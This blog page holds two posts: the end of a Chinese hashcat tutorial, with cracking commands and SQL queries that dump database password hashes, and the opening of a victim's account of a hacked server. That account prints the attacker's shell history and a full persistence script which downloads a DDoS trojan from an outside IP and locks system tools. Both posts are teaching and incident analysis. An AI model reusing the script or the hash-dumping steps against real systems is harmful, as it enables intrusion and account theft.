<h1 id="hashcat-–force-a-3-m-1400-hash-txt-l-l-l-l-l"><a href="#hashcat-–force-a-3-m-1400-hash-txt-l-l-l-l-l" class="headerlink" title="hashcat –force -a 3 -m 1400 hash.txt ?l?l?l?l?l"></a>hashcat –force -a 3 -m 1400 hash.txt ?l?l?l?l?l</h1><p>纯sha384,五位小写字母:</p>
<p>1</p>
<h1 id="hashcat-–force-a-3-m-10800-hash-txt-l-l-l-l-l"><a href="#hashcat-–force-a-3-m-10800-hash-txt-l-l-l-l-l" class="headerlink" title="hashcat –force -a 3 -m 10800 hash.txt ?l?l?l?l?l"></a>hashcat –force -a 3 -m 10800 hash.txt ?l?l?l?l?l</h1><p>纯sha512,五位小写字母[速度稍慢]:</p>
<p>1</p>
<h1 id="hashcat-–force-a-3-m-1700-hash-txt-l-l-l-l-l"><a href="#hashcat-–force-a-3-m-1700-hash-txt-l-l-l-l-l" class="headerlink" title="hashcat –force -a 3 -m 1700 hash.txt ?l?l?l?l?l"></a>hashcat –force -a 3 -m 1700 hash.txt ?l?l?l?l?l</h1><p>破解 linux 系统用户密码hash[可能稍微有些慢,相比之下用john这也是一款比较好用的hash破解工具,后续我们还会单独说跑,效果可能会更好一些]:</p>
<p>1</p>
<h1 id="hashcat-–force-a-3-m-1800-hash-txt-l-l-l-l-l"><a href="#hashcat-–force-a-3-m-1800-hash-txt-l-l-l-l-l" class="headerlink" title="hashcat –force -a 3 -m 1800 hash.txt ?l?l?l?l?l"></a>hashcat –force -a 3 -m 1800 hash.txt ?l?l?l?l?l</h1><p>破解 win 2008 系统用户的 ntlm hash [实际破解中只需要破解ntlm部分的值即可,lm的值就不用了,另外,还有域中的各类证书散列类型破解基本都是如此,这里就不一一举例了]:</p>
<p>1</p>
<h1 id="hashcat-–force-hash-txt-m-1000-a-6-dic1-txt-s-s-s-d-d-d"><a href="#hashcat-–force-hash-txt-m-1000-a-6-dic1-txt-s-s-s-d-d-d" class="headerlink" title="hashcat –force hash.txt -m 1000 -a 6 dic1.txt ?s?s?s?d?d?d"></a>hashcat –force hash.txt -m 1000 -a 6 dic1.txt ?s?s?s?d?d?d</h1><p>破解 mysql 4/5.x 数据库用户hash[ 记得实际破解的时候把hash开头的*去掉,要不然可能识别不出来 ]:</p>
<p>1<br>2</p>
<h1 id="select-from-mysql-user-G"><a href="#select-from-mysql-user-G" class="headerlink" title="select * from mysql.user\G;"></a>select * from mysql.user\G;</h1><h1 id="hashcat-–force-hash-txt-m-300-a-3-l-l-l-l"><a href="#hashcat-–force-hash-txt-m-300-a-3-l-l-l-l" class="headerlink" title="hashcat –force hash.txt -m 300 -a 3 ?l?l?l?l"></a>hashcat –force hash.txt -m 300 -a 3 ?l?l?l?l</h1><p>破解 mssql系列[2005/2008/2012] 数据库用户hash:</p>
<p>1<br>2</p>
<h1 id="SELECT-name-password-hash-FROM-master-sys-sql-logins"><a href="#SELECT-name-password-hash-FROM-master-sys-sql-logins" class="headerlink" title="SELECT name, password_hash FROM master.sys.sql_logins"></a>SELECT name, password_hash FROM master.sys.sql_logins</h1><h1 id="hashcat-–force-hash-txt-m-132-a-3-l-l-l-l-l-d-d-d"><a href="#hashcat-–force-hash-txt-m-132-a-3-l-l-l-l-l-d-d-d" class="headerlink" title="hashcat –force hash.txt -m 132 -a 3 ?l?l?l?l?l?d?d?d"></a>hashcat –force hash.txt -m 132 -a 3 ?l?l?l?l?l?d?d?d</h1><p>破解 pgsql 数据库用户hash [ 其实是md5的变种,跑的时候记得把hash开头的md5去掉,不过自己在实际跑的过程中,暂时还有些问题,如果用普通的md5来跑,跑出来的明文和我实际的密码还有一些出入 ]:</p>
<p>1<br>2</p>
<h1 id="SELECT-usename-passwd-FROM-pg-shadow"><a href="#SELECT-usename-passwd-FROM-pg-shadow" class="headerlink" title="SELECT usename, passwd FROM pg_shadow;"></a>SELECT usename, passwd FROM pg_shadow;</h1><h1 id="hashcat-–force-hash-txt-m-12-a-3-l-l-l-l-l-d-d-d"><a href="#hashcat-–force-hash-txt-m-12-a-3-l-l-l-l-l-d-d-d" class="headerlink" title="hashcat –force hash.txt -m 12 -a 3 ?l?l?l?l?l?d?d?d"></a>hashcat –force hash.txt -m 12 -a 3 ?l?l?l?l?l?d?d?d</h1><p>破解 oracle 11g 数据库用户hash[记得倒数第20个字符加 : ,要把盐区分出来]:</p>
<p>1<br>2<br>3</p>
<h1 id="SELECT-name-spare4-FROM-sys-user"><a href="#SELECT-name-spare4-FROM-sys-user" class="headerlink" title="SELECT name,spare4 FROM sys.user$;"></a>SELECT name,spare4 FROM sys.user$;</h1><p>S:EC9E3B871377F217DCFA18F1B84F2F2EACFF9299:AB4B59A17C93F8CB4840</p>
<h1 id="hashcat-–force-hash-txt-m-112-a-3-l-l-l-l-l"><a href="#hashcat-–force-hash-txt-m-112-a-3-l-l-l-l-l" class="headerlink" title="hashcat –force hash.txt -m 112 -a 3 ?l?l?l?l?l"></a>hashcat –force hash.txt -m 112 -a 3 ?l?l?l?l?l</h1><p>破解 wpa/wpa2 握手包中的无线密码hash [可能需要你自己先把握手包用wpaclean整理一下,再用aircrack输出成hashcat认识的散列格式,非常实用,具体内容请查看无线破解相关文章]:</p>
<p>1</p>
<h1 id="hashcat-a-3-m-2500-wpahash-hccap-l-l-l-l-l-l-l-l"><a href="#hashcat-a-3-m-2500-wpahash-hccap-l-l-l-l-l-l-l-l" class="headerlink" title="hashcat -a 3 -m 2500 wpahash.hccap ?l?l?l?l?l?l?l?l"></a>hashcat -a 3 -m 2500 wpahash.hccap ?l?l?l?l?l?l?l?l</h1><p>破解 wordpress 4.x 用户密码hash [实际测试版本 4.7.4],具体加密方式在wp-includes\class-phpass.php 文件中的HashPassword()函数中</p>
<p>1</p>
<h1 id="hashcat-–force-hash-txt-m-400-a-3-l-l-l-d-d-d"><a href="#hashcat-–force-hash-txt-m-400-a-3-l-l-l-d-d-d" class="headerlink" title="hashcat –force hash.txt -m 400 -a 3 ?l?l?l?d?d?d"></a>hashcat –force hash.txt -m 400 -a 3 ?l?l?l?d?d?d</h1><p>破解 joomla &lt; 2.5.18 用户密码hash [实际测试版本 joomla 2.5.1],具体加密方式在 libraries\joomla\user\helper.php 文件中的genRandomPassword()和getCryptedPassword()函数中</p>
<p>1</p>
<h1 id="hashcat-–force-hash-txt-m-11-a-3-l-l-l-l-l"><a href="#hashcat-–force-hash-txt-m-11-a-3-l-l-l-l-l" class="headerlink" title="hashcat –force hash.txt -m 11 -a 3 ?l?l?l?l?l"></a>hashcat –force hash.txt -m 11 -a 3 ?l?l?l?l?l</h1><p>破解 joomla &gt; 2.5.18 用户密码hash [跟上面wp的散列类型其实是一样的,但自己实际跑的时候hash却没有识别出来,暂时还没找到问题的根源,如果有成功的朋友,麻烦也告诉我一下,实际测试版本joomla 3.7],具体加密方式在 libraries\joomla\user\helper.php 文件中的genRandomPassword()和getCryptedPassword()函数中</p>
<p>1</p>
<h1 id="hashcat-–force-hash-txt-m-400-a-3-l-l-l-l-l"><a href="#hashcat-–force-hash-txt-m-400-a-3-l-l-l-l-l" class="headerlink" title="hashcat –force hash.txt -m 400 -a 3 ?l?l?l?l?l"></a>hashcat –force hash.txt -m 400 -a 3 ?l?l?l?l?l</h1><p>破解drupal 7.x 用户密码hash [ 实际测试版本7.5.4 ],具体加密方式在 includes\password.inc 文件中的_password_crypt函数中</p>
<p>1</p>
<h1 id="hashcat-–force-m-7900-hash-txt-a-3-l-l-l-l-l"><a href="#hashcat-–force-m-7900-hash-txt-a-3-l-l-l-l-l" class="headerlink" title="hashcat –force -m 7900 hash.txt -a 3 ?l?l?l?l?l"></a>hashcat –force -m 7900 hash.txt -a 3 ?l?l?l?l?l</h1><p>破解discuz 3.x 用户密码hash [实际测试版本discuz x3.2 ,暂时还有些问题],具体加密方式在 uc_client\model\user.php 文件中的add_user函数中</p>
<p>1</p>
<h1 id="hashcat-–force-m-2611-hash-txt-a-3-l-l-l-l-l"><a href="#hashcat-–force-m-2611-hash-txt-a-3-l-l-l-l-l" class="headerlink" title="hashcat –force -m 2611 hash.txt -a 3 ?l?l?l?l?l"></a>hashcat –force -m 2611 hash.txt -a 3 ?l?l?l?l?l</h1><p>破解phpbb3 用户密码hash [实际测试版本 phpbb3.2,暂时还有些问题]:</p>
<p>1</p>
<h1 id="hashcat-–force-m-400-hash-txt-a-3-l-l-l-l-l-d-d-d"><a href="#hashcat-–force-m-400-hash-txt-a-3-l-l-l-l-l-d-d-d" class="headerlink" title="hashcat –force -m 400 hash.txt -a 3 ?l?l?l?l?l?d?d?d"></a>hashcat –force -m 400 hash.txt -a 3 ?l?l?l?l?l?d?d?d</h1><p>破解 htpasswd 密码hash [也有些问题]:</p>
<p>1</p>
<h1 id="hashcat-–force-m-1500-hash-txt-a-3-d-d-d-d-d-d"><a href="#hashcat-–force-m-1500-hash-txt-a-3-d-d-d-d-d-d" class="headerlink" title="hashcat –force -m 1500 hash.txt -a 3 ?d?d?d?d?d?d"></a>hashcat –force -m 1500 hash.txt -a 3 ?d?d?d?d?d?d</h1><p>破解Adobe PDF 11文件密码hash,后面针对这种包公套件的加密破解,都需要自己先把hash提取出来,在john基本都有对应的hash提取脚本,可直接用,后续我们再说,下面几种类型的破解有几个还有一些问题,不过,我们后面用john来搞就好了</p>
<p>1</p>
<h1 id="hashcat-–force-m-10700-hash-txt-a-3-d-d-d-d-d-d"><a href="#hashcat-–force-m-10700-hash-txt-a-3-d-d-d-d-d-d" class="headerlink" title="hashcat –force -m 10700 hash.txt -a 3 ?d?d?d?d?d?d"></a>hashcat –force -m 10700 hash.txt -a 3 ?d?d?d?d?d?d</h1><p>破解 Office 2013 文件密码hash:</p>
<p>1</p>
<h1 id="hashcat-–force-m-9600-hash-txt-a-3-d-d-d-d-d-d"><a href="#hashcat-–force-m-9600-hash-txt-a-3-d-d-d-d-d-d" class="headerlink" title="hashcat –force -m 9600 hash.txt -a 3 ?d?d?d?d?d?d"></a>hashcat –force -m 9600 hash.txt -a 3 ?d?d?d?d?d?d</h1><p>破解 RAR5压缩文件密码hash:</p>
<p>1</p>
<h1 id="hashcat-–force-m-13000-hash-txt-a-3-d-d-d-d-d-d"><a href="#hashcat-–force-m-13000-hash-txt-a-3-d-d-d-d-d-d" class="headerlink" title="hashcat –force -m 13000 hash.txt -a 3 ?d?d?d?d?d?d"></a>hashcat –force -m 13000 hash.txt -a 3 ?d?d?d?d?d?d</h1><p>破解 7-Zip压缩文件密码hash:</p>
<p>1</p>
<h1 id="hashcat-–force-m-11600-hash-txt-a-3-d-d-d-d-d-d"><a href="#hashcat-–force-m-11600-hash-txt-a-3-d-d-d-d-d-d" class="headerlink" title="hashcat –force -m 11600 hash.txt -a 3 ?d?d?d?d?d?d"></a>hashcat –force -m 11600 hash.txt -a 3 ?d?d?d?d?d?d</h1><p>破解 WinZip压缩文件密码hash:</p>
<p>1</p>
<h1 id="hashcat-–force-m-13600-hash-txt-a-3-d-d-d-d-d-d"><a href="#hashcat-–force-m-13600-hash-txt-a-3-d-d-d-d-d-d" class="headerlink" title="hashcat –force -m 13600 hash.txt -a 3 ?d?d?d?d?d?d"></a>hashcat –force -m 13600 hash.txt -a 3 ?d?d?d?d?d?d</h1><p>破解grub 2.x hash:</p>
<p>1</p>
<h1 id="hashcat-–force-m-7200-hash-txt-a-3-d-d-d-d-d-d"><a href="#hashcat-–force-m-7200-hash-txt-a-3-d-d-d-d-d-d" class="headerlink" title="hashcat –force -m 7200 hash.txt -a 3 ?d?d?d?d?d?d"></a>hashcat –force -m 7200 hash.txt -a 3 ?d?d?d?d?d?d</h1><p>破解 TrueCrypt 密码hash[曾经还算是个比较强的磁盘加密工具,自己也一直在用,只不过后来发生了一段故事,导致它官方自爆不再安全,也是尴尬]:</p>
<p>1</p>
<h1 id="hashcat-–force-m-62XY-hash-txt-a-3-d-d-d-d-d-d"><a href="#hashcat-–force-m-62XY-hash-txt-a-3-d-d-d-d-d-d" class="headerlink" title="hashcat –force -m 62XY hash.txt -a 3 ?d?d?d?d?d?d"></a>hashcat –force -m 62XY hash.txt -a 3 ?d?d?d?d?d?d</h1><p>破解 Skype 密码hash [需要自己从对应的xml文件把hash提取出来,很抱歉,我没成功]:</p>
<p>1</p>
<h1 id="hashcat-–force-m-23-hash-txt-a-3-d-d-d-d-d-d"><a href="#hashcat-–force-m-23-hash-txt-a-3-d-d-d-d-d-d" class="headerlink" title="hashcat –force -m 23 hash.txt -a 3 ?d?d?d?d?d?d"></a>hashcat –force -m 23 hash.txt -a 3 ?d?d?d?d?d?d</h1><p>0x09 关于GPU参数优化 [ 这次根本没用到 ]和自定义破解规则[比较复杂,但更智能灵活,可这也就意味着速度就..嘿嘿,你懂的]方面的东西,这里暂时就不提了,仅仅作为hash破解入门,这些差不多足以应对你日常的各种破解需求了</p>
<p>0x10 关于在实际破解中自己的一些建议,暂以大批量hash爆破为例[事先没有任何密码规律可循,只能盲测的那种情况]</p>
<p>1<br>2<br>3<br>4<br>首先,弱口令字典先走一遍再说<br>其次,跑掩码,把所有想跑的掩码全部事先放到.hcmask文件中,然后加载它自动跑,上面已有介绍<br>或者,如果只是针对单条hash,在上述方法都跑不出来的情况下,可以去仔细分析下目标的密码设置规律,再尝试组合,可能效率会高一点,但那也只是可能<br>最后,如果你自己真的有能力,可以想办法把它做成分布式快速hash破解产品[密码机],然后拿到市面上去卖,也是完全可行的,毕竟已经有很多成功的案例,只不过你可能更多应该考虑下怎么比别人做的效率更高,更易用,不然,很难有市场<br>0x11 关于密码安全的一些个人建议</p>
<p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>密码要保持足够的随机性,绝不要让别人轻易分析出的你密码设置习惯和规律,有很多的字典生成工具中的算法就是根据这个来的,不然,很快就会被别人撞到密码<br>密码字符要足够混乱,严禁将单纯的大小写字母,数字,作为密码,在保证密码随机性的前提下,密码中最好同时包含有数字,大小写字母,特殊字符<br>保证必要的密码长度,推荐至少15位以上,我们也看到了,对于那种8,9位的纯字母数字的密码,在hashcat面前基本是不堪一击的,当然啦,等量子或者光子计算机技术成熟以后,估计现有的各种加密算法,基本要沦陷一大半了,另外,看到很多说密码要经常改,其实,个人认为在你密码没有任何泄露而且足够复杂的前提下,根本没有必要经常改,不过,这也是建立在你没有被人搞进去的大前提下的,密码即使再复杂,如果一下被人抓到了明文,也就是个摆设了,个人一直都认为安全本来就是一个多维度的东西,渗透者需要的有时只是一个有突破性的点,而防御者却要防御所有可能被攻破的维度,所以,一个优秀的防御者,在此之前也一定是一个优秀渗透者,个人坚信,”运维会的那套东西,你要比他更精通,你才有可能搞定他,开发会的东西,你要比他写的更熟练积累的更多,才有可能挖到有价值的洞,天天嘴上说架构安全说的天花乱坠,不说一定要实际生产环境,甚至自己在本地连测试架构的环境都没部署过,怎么可能安全呢,说说也就只能是说说了”,实在不好意思,多啰嗦了一点,个人说话可能有些犀利,大家别介意哈,也许以后你们会习惯我这种风格的,不喜欢废话, 坦诚,一针见血,既然说就说点儿上嘛, 噱头,虚头巴脑装逼的东西,在我这儿基本不会有,个人比较偏向实战,一直坚信,技术没有好坏,能搞进去就行,说的再高端,做题做的再好,如果不能用于真实的渗透场景,意义何在呢,对于渗透来讲,结果无非两个,”进去了或者没进去”,至于方法,没人管你<br>严禁一个密码同时用于n个账号登陆,不然,别人只需要拿着这一个密码就可以到你经常去的其它网站上把你的私人信息翻个顶儿朝天了,想必很多人为了图方便[起码在很久很久以前,自己也这样做过],可能都会这样做,很显然这是一种非常傻叉的行为,比如,专门针对此的”撞库攻击”,其实,说到这里还想再多提一点信息搜集里的东西,”水坑攻击”,其实,就是搜集的社交关系网,然后,在你经常去的一些偏门的站点上等着你,要么社工,要直接把那个站搞下来,嘿嘿……关于这些东西,后续还会有专门篇幅说,别着急<br>严禁把密码随意泄露给别人,这年头,社工几乎是无处不在的<br>认清钓鱼站,看清楚再敲,不然,账号密码就被丢到别人的机器上了<br>严禁把明文密码直接写到文件保存到系统里, 这等于给别人留了个后门,一条命令就什么都有了</p>
<p>0x12 后话:<br>    纵观全文,单单就工具使用来讲,还是蛮简单的,希望你也是这种感觉,那我文章的目的就达到了,嘿嘿……[虽然过程中还存在着一些瑕疵,待后期找到原因会再补充上来],作为使用基本也不存在什么技术含量,真正的难点可能还是在于对各种加密算法加密细节的理解[这里没有涉及的原因,是我怕把大家带沟里了,所以,想想还是算了,我们是在讲渗透,而非专门研究加密解密]和工具自身的破解算法上,还是那句话,我们并不是为了专门研究密码学[这么复杂的数学问题还是留给那些聪明秃顶的人去搞吧,我们只需要躺着享用他们的成果就好了,站在他们的肩膀上,也许能走的更快,毕竟,我们最终的目想获取目标机器的最高权限,手段不限,而hash破解只是这其中的一个环节而已]或者编写此类的hash破解工具[千万别偏离了方向,务必懂得取舍,不然容易”走火入魔”],对于渗透者来说,我们只是想利用手里现有的各种凭证,来继续下一步的渗透动作,仅此而已,所以,大可不用在这些工具上浪费太多的时间,能快速上手,并且能跑出来自己想要的东西才是主要目的,与其花那么长的时间在这种工具上,不如花更多的时间好好想想该如何’搞’到这些hash才是正途,搞到hash起码还能说明你离目标又近了一步,连hash到搞不到才是真正的尴尬,不忘初心,方得永生!说这么多绝不是在教唆怂恿大家去干坏事儿哈,由此文章所引发的一切后果,与本公众号及本文作者无任何关系,本质还是想让大家用别人干坏事儿的方法来保护我们自己,都是成年人,不要做傻逼事儿,相信你会懂的,如果你觉得这些东西对你有用,请持续关注本人公众号,可能暂时还没什么文章,不过后续就可能会有大批你感兴趣的文章了,嘿嘿…写文章确实不容易,都不是信手拈来的,要一边测,一边截图,一边写,生怕写错,所以出文章的速度可能大打折扣,当然啦,我也可以写的很快,很粗糙,而且没有经过任何实战的考量就告诉大家,不过,我自己还是想尽量给大家一些更实用的东西,凭空意淫出来的东西,可能对大家并没有什么实质性的帮助,很久之前,在某个前辈的博客上,看到过这么一句话,觉得对我的触动一直都挺大的,这里也分享给大家共勉,”我所说过的我都做过”,希望大家谅解, hash破解的东西还没完,后续还会紧接着奉上,转载请务必注明出处,谢谢,欢迎大家一起交流</p>

      
    </div>
    <footer class="article-footer">
      

      
      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-服务器被黑之后的心路历程"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/03/30/服务器被黑之后的心路历程/">服务器被黑之后的心路历程</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/03/30/服务器被黑之后的心路历程/" class="article-date">
	  <time datetime="2018-03-30T06:59:34.000Z" itemprop="datePublished">2018-03-30</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>服务器被黑之后的心路历程</p>
<p>不久前读了一篇黑客故事（ 高手对决 – 博客服务器被黑的故事），读完此文后，才意识到我的机器是处于裸奔状态，便饶有兴致地去服务器检查了一下日志。发现还真有人在尝试对我的机器进行暴力破解（一下简称爆破），而且攻势还挺猛，当天就有1w+的暴力尝试！但是当时并没有特别去在意，被黑这种事情应该不会发生的……吧……</p>
<p>只是，几天之后的某一天（2月3号）深夜，趴在床上休闲的看邮件时，收到了DO在1月29号发的警告邮件（DO：Digital Ocean, 一个vps主机提供商，这个博客就是架设在我在DO的vps上）：</p>
<p>We are sorry to report that we have detected what appears to be a large flood of traffic from one or more of your servers that is disrupting the normal traffic flow for other users.</p>
<p>To prevent this traffic from causing further disruption, we have disabled the networking interface on the server or servers involved…</p>
<p>什么情况！我的服务器被黑了！！？DO把我的服务封了！！？立马打开浏览器访问我的博客主页，果然挂了。然后尝试ssh登录到主机，连接不上，果然主机被封了！而且这邮件是五天前发的，我现在才知道！吓得当时我的表情是这样的：</p>
<img src="/2018/03/30/服务器被黑之后的心路历程/1.jpg">
<p>寻找线索<br>第二天起床之后，立马跑到自习室进入忘我模式，开始追查原因！</p>
<p>服务器网络被禁，没法ssh登录。幸好， DO 提供了Web console接口，可以通过Web界面来登录服务器。</p>
<p>“DO把我服网络封禁了，那贼现在应该无法控制我的服务器”，心里再一次暗想着，“现在暂时无需修改密码来防止主机被再次控制，先先找出问题所在吧。”</p>
<p>再次打开邮件，观察DO提供的报警信息：</p>
<p>We are sorry to report that we have detected what appears to be a large flood of traffic from one or more of your servers that is disrupting the normal traffic flow for other users.</p>
<p>To prevent this traffic from causing further disruption, we have disabled the networking interface on the server or servers involved…</p>
<p>“难道服务器被劫持作为肉鸡来攻击其它的网络了！？”，那是一头雾水啊，完全不清楚攻击者究竟利用我服做了什么事情，看起来好像是被当肉鸡了哎 ╮(╯▽╰)╭。</p>
<p>所以接下来理所当然的去查看有问题的进程了。</p>
<p>既然是traffic flood，那就先从网络检查起。</p>
<p>$ sudo ss -p<br>State       Recv-Q Send-Q   Local Address:Port       Peer Address:Port<br>SYN-SENT    0      4            127.0.0.1:36512      183.60.149.202:43200<br>users:((“icnanker”,14519,4))<br>…<br>不出所料果然看到了一个很可疑的程序：icnanker，它在不停的尝试往183.60.149.202:43200发送tcp syn包！立马搜这个IP的信息，只发现这是东莞的一个IP。那继续吧，先找出所有有问题的进程再说。</p>
<p>果然在进程列表中找到了三个很可疑的进程：</p>
<p>$ ps aux<br>(…)<br>root     13648  0.0  0.1 23656   556 ?        Ss    Jan28   0:43 /etc/init.d/apache2.sh<br>root     14519  0.0  0.2 85872  1208 ?        S     Jan28   23:41 /usr/bin/icnanker<br>root     26595  0.0  0.2 61364  1224 ?        S     Jan28   0:00 /usr/bin/.sshd<br>(…)<br>第一，我没有装apache，apache2.sh这样的名字实在是太可疑了。</p>
<p>第二，.sshd这个进程的名字更可疑，sshd守护进程是sshd，伪装得太不像了。</p>
<p>第三，只有这三个进程都是在Jan28启动的，也就是1月28号，这让我联想到29号造成的traffic flood。肯定有问题。</p>
<p>接着下意识的去翻阅登录日志：</p>
<h1 id="grep-“Accepted”-var-log-auth-log-1"><a href="#grep-“Accepted”-var-log-auth-log-1" class="headerlink" title="grep “Accepted” /var/log/auth.log.1"></a>grep “Accepted” /var/log/auth.log.1</h1><p>(…)<br>Jan 26 16:55:49 mon sshd[13955]: Accepted password for root from 61.160.247.8 port 1604 ssh2<br>Jan 28 17:12:03 mon sshd[30407]: Accepted password for root from 61.166.50.23 port 3343 ssh2<br>(…)</p>
<h1 id="grep-“Jan-2-5-8-sshd-Failed”-var-log-auth-log-1-wc"><a href="#grep-“Jan-2-5-8-sshd-Failed”-var-log-auth-log-1-wc" class="headerlink" title="grep “Jan 2[5-8] .sshd.Failed” /var/log/auth.log.1 | wc"></a>grep “Jan 2[5-8] .<em>sshd.</em>Failed” /var/log/auth.log.1 | wc</h1><p>  21806  355851 2333557<br>！！！！</p>
<p>Jan 26和 Jan 28都有人在我的机器上登录过root账号！Ip来源发现分别是云南和江苏的，也是非常诡异。接着让我更吃惊的是从Jan 25到Feb 28，共有2w+的暴破尝试！</p>
<p>在看到这些结果的瞬间其实我就明白了为何我会被攻破——因为我的密码设置得非常非常简单，简单到和“123456”这样的密码差不多。这个时候我的表情是这样的：<br><img src="/2018/03/30/服务器被黑之后的心路历程/2.jpg"></p>
<p>立马切换到root用户，查看root命令记录，看看能不能追踪到这个家伙在我机器上做过什么，同时在心里像上帝祈祷希望他没擦去脚印。</p>
<h1 id="history"><a href="#history" class="headerlink" title="history"></a>history</h1><p>(…)<br>    4  cp /usr/bin/wget /usr/bin/vget<br>    5  cp /usr/bin/chattr /usr/bin/lockr<br>    6  chmod 0 /usr/bin/chattr;chmod 0 /usr/bin/wget<br>    7  lockr +i /usr/bin/chattr;lockr +i /usr/bin/wget<br>    8  chmod 0755 /usr/bin/vget;chmod 0755 /usr/bin/lockr<br>    9  vget <a href="http://183.60.149.202:8080/apache2.sh" target="_blank" rel="noopener">http://183.60.149.202:8080/apache2.sh</a><br>   10  mv /root/apache2.sh /etc/init.d/apache2.sh<br>   11  chmod 0755 /etc/init.d/apache2.sh<br>   12  nohup sh /etc/init.d/apache2.sh &gt;/dev/null 2&gt;&amp;1 &amp;<br>   13  lockr +i /etc/init.d/apache2.sh<br>   14  vi /etc/rc.local<br>   15  lockr +i /etc/rc.local<br>   16  less /etc/init.d/apache2.sh<br>感慨万千，万千感慨，“还好，这个傻逼没有擦去脚印”，哈哈哈哈哈。。</p>
<p>做抱拳状，站起，出自习室，接开水，回来，继续！</p>
<p>“我需要知道，这家伙究竟对我的机器干了些什么！”</p>
<p>从上面的命令记录来看，/etc/init.d/apache2.sh这个脚本有很大的嫌疑，查看脚本内容：</p>
<h1 id="cat-etc-init-d-apache2-sh"><a href="#cat-etc-init-d-apache2-sh" class="headerlink" title="cat /etc/init.d/apache2.sh"></a>cat /etc/init.d/apache2.sh</h1><p>#!/bin/sh<br>while [ 1 -gt 0 ];do<br>Get=”/usr/bin/vget”<br>Lok=”/usr/bin/lockr”<br>Bak=”/usr/bin/.filebak”<br>hosts=”/etc/hosts.bak”<br>File=”/usr/bin/icnanker”<br>if [ ! -f  “$hosts” ];then<br>    cp -f /etc/hosts.deny /etc/hosts.bak<br>    lockr +i /etc/hosts.bak<br>fi<br>if [ ! -f  “$Lok” ];then<br>    cp -f /usr/bin/chattr /usr/bin/lockr<br>    cp -f /usr/bin/chattr /usr/bin/.locks<br>    cp -f /usr/bin/.locks /usr/bin/lockr<br>    chmod 0755 /usr/bin/lockr<br>    chmod 0755 /usr/bin/.locks<br>    lockr +i /usr/bin/lockr<br>    lockr +i /usr/bin/.locks<br>fi<br>if [ ! -f  “$Get” ];then<br>    cp -f /usr/bin/wget /usr/bin/vget<br>    cp -f /usr/bin/wget /usr/bin/.bget<br>    cp -f /usr/bin/.bget /usr/bin/vget<br>    chmod 0755 /usr/bin/vget<br>    chmod 0755 /usr/bin/.bget<br>    lockr +i /usr/bin/vget<br>    lockr +i /usr/bin/.bget<br>fi<br>Exist=<code>ss|grep 183.60.149.202:43200|grep -v &quot;grep&quot;</code><br>if [ -z “$Exist” ];then<br>    lockr -i /usr/bin/.filebak<br>    lockr -i /usr/bin/icnanker<br>    chmod 0755 /usr/bin/.filebak<br>    chmod 0755 /usr/bin/icnanker<br>    if [ ! -f  “$File” ];then<br>        if [ ! -f  “$Bak” ];then<br>            rm -f /etc/init.d/icnanker;rm -f /etc/init.d/icnanker.1<br>            vget -P /etc/init.d/ vget <a href="http://183.60.149.202:8080/icnanker" target="_blank" rel="noopener">http://183.60.149.202:8080/icnanker</a><br>            mv /etc/init.d/icnanker /usr/bin/icnanker<br>        else<br>            cp -f /usr/bin/.filebak /usr/bin/icnanker<br>        fi<br>    fi<br>    pkill icnanker;pkill icnanker<br>    chmod 0755 /usr/bin/icnanker<br>    lockr +i /usr/bin/icnanker<br>    /usr/bin/icnanker<br>fi<br>if [ ! -f  “$Bak” ];then<br>    cp -f /usr/bin/icnanker /usr/bin/.filebak<br>    chmod 0755 /usr/bin/.filebak<br>    lockr +i /usr/bin/.filebak<br>fi<br>chmod 0 /usr/bin/wget<br>lockr +i /usr/bin/wget<br>chmod 0 /usr/bin/chattr<br>lockr +i /usr/bin/chattr<br>chmod 0 /usr/lib/sftp-server<br>lockr +i /usr/lib/sftp-server<br>lockr -i /etc/hosts.deny;cp /etc/hosts.bak /etc/hosts.deny;lockr +i /etc/hosts.deny<br>sleep 30<br>done<br>仔细看下来，这应该是”icnanker”的后台守护程序，确保”icnanker”一直在运行。</p>
<p>那”icnanker”究竟是干什么的，究竟在我的系统上干了什么，服务器还有什么其他的“坏家伙”在？</p>
<p>尝试打开“icnanker”，看看“icnanker”的内容，发现它是二进制的，无法查看该木马的具体作用。但是根据 DO 的检测、apache2.sh脚本内容以及”icnanker”一直在进行着的大量tcp链接尝试可以看出，似乎这是一个DDoS木马，syn flood。</p>
<p>于是开始在网络上搜索该木马的详细信息，一番尝试之后，还是没能找到关于这个木马的详细信息，“那就先放着，先揪出其他木马再说”。</p>
<p>全城搜查<br>此时的我有点慌乱和无头绪，“对病毒一点都不了解呢”，“不过，这点问题可难不倒我，移步google！”</p>
<p>经过一番查找之后，发现了 clamAV 这个工具，一个很popular的开源病毒引擎，能够扫描检测木马、病毒和恶意程序，正乃我所需啊！！</p>
<p>马上用 clamAV 神器扫描全站文件，果然还发现了不少其他的木马：</p>
<p>/usr/bin/icnanker<br>/usr/bin/.filebak<br>/usr/bin/.sshd<br>/usr/bin/lsof<br>/usr/bin/bsd-port/getty<br>/bin/ps<br>/bin/netstat<br>/bin/ss<br>Oh, no！！！</p>
<p>ps, netstat, ss, lsof 这些很常用的监控服务器状态的系统工具全部被掉包了！</p>
<p>“真是危险，要是没有在全机进行病毒搜索的话，很容易就会又被莫名其妙的感染了！”，心里直冒冷汗。</p>
<p>这个时候，我的表情是这样的：</p>
<img src="/2018/03/30/服务器被黑之后的心路历程/3.jpg">
<p>嗯，心情非常沉重。非常沉重。非常非常的沉重。</p>
<p>怀着沉重的心情，开始出其意料的冷静思考，得出以下推断（事实）：</p>
<p>攻击者利用暴破登录服务器，1月26号成功突破，1月28号种下木马，29号开始进行tcp syn flood,flood持续一段时间后，被DO检测到，封了我的主机。<br>攻击者没有清除日志，没有做对机器有极大破坏性的事情。<br>攻击者不仅仅是种下”icnanker”这一个显而易见的木马，还用一些其他的木马掉包了本机上的关键程序。<br>那么，我需要反抗了。</p>
<p>杀掉木马进程</p>
